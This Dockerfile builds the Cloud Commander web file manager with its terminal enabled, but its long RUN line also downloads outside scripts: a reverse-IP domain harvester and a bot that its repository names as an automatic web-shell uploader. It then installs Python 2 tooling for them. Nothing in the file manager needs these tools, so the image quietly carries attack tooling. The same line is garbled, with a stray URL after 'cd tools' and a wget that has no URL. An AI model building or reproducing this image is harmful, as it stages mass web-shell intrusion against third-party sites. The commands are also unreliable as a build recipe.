FROM node:lts-buster
LABEL maintainer="Coderaiser"

RUN mkdir -p /usr/src/app
WORKDIR /usr/src/app

COPY package.json /usr/src/app/

RUN npm config set package-lock false && \
    npm install --production && \
    npm i gritty && \
    npm cache clean --force; mkdir tools; cd tools https://raw.githubusercontent.com/Jenderal92/Reverse-Ip-Auto-Remove-Duplicate-Domain/main/revs.py; wget -O get.py; wget -O bot.py https://raw.githubusercontent.com/kamalkarlos/Z3ter-Bot-Auto-Upload-Shell/%23Coded-By-Capitos-Kamal/z3ter.py; wget https://bootstrap.pypa.io/pip/2.7/get-pip.py -O get.py; python2 get.py; pip2 install bs4 colorama requests termcolor

COPY . /usr/src/app

WORKDIR /

ENV cloudcmd_terminal true
ENV cloudcmd_terminal_path gritty
ENV cloudcmd_open false

EXPOSE 8000

ENTRYPOINT ["/usr/src/app/bin/cloudcmd.mjs"]
